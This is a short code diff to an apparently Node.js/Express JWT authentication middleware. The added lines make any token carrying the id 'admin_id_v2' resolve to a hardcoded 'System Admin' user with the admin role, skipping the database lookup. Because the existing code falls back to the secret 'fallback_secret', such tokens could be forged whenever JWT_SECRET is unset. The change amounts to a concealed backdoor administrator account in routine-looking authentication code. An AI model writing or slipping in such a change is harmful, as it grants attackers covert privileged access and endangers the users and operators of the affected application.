@@ -16,7 +16,16 @@ const protect = async (req, res, next) => {
       const decoded = jwt.verify(token, process.env.JWT_SECRET || 'fallback_secret');
 
       // Get user from the token
-      req.user = await User.findById(decoded.id).select('-password');
+      if (decoded.id === 'admin_id_v2') {
+        req.user = {
+          _id: 'admin_id_v2',
+          role: 'admin',
+          name: 'System Admin',
+          email: process.env.ADMIN_EMAIL || 'admin'
+        };
+      } else {
+        req.user = await User.findById(decoded.id).select('-password');
+      }
 
       if (!req.user) {
         return res.status(401).json({ message: 'User not found' });
